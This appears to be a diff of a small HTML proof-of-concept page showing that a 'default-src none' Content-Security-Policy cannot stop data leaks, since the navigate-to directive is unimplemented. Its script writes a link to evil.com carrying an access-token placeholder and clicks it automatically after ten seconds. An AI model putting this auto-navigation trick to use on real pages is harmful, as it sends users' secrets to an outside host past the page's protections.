@@ -1,17 +1,17 @@
 <html>
-  <head>
-    <meta http-equiv="Content-Security-Policy" content="default-src 'none';">
-    <script>
-      function leak() {
-        document.write(`<a id="ddd" href="//evil.com?secret=${'___ACCESS_TOKEN___'}"> This anchor will be clicked in 10 seconds, no user interaction required </a>`);
-        setTimeout(() => ddd.click(), 10*1000);
-      }
-    </script>
+<head>
+    <meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'nonce-xxx' ">
     <p>
-      CSP in this page does not allow network connection to anywhere (<code> default-src 'none'; </code>).
-      But since <code> navigate-to </code> directive <a href="https://content-security-policy.com/navigate-to/#:~:text=Unimplimented%20Feature"> isn't implemented to browsers </a>,
-      anyone can leak anything to anywhere eventually, if they really want to.
+        CSP in this page does not allow network connection to anywhere (<code> default-src 'none'; </code>).
+        But since <code> navigate-to </code> directive <a href="https://content-security-policy.com/navigate-to/#:~:text=Unimplimented%20Feature"> isn't implemented to browsers </a>,
+        anyone can leak anything to anywhere eventually, if they really want to.
     </p>
-    <script> leak(); </script>
-  </head>
+    <script nonce="xxx">
+        function leak() {
+            document.write(`<a id="ddd" href="//evil.com?secret=${'___ACCESS_TOKEN___'}"> This anchor will be clicked in 10 seconds, no user interaction required </a>`);
+            setTimeout(() => ddd.click(), 10*1000);
+        }
+        leak();
+    </script>
+</head>
 </html>
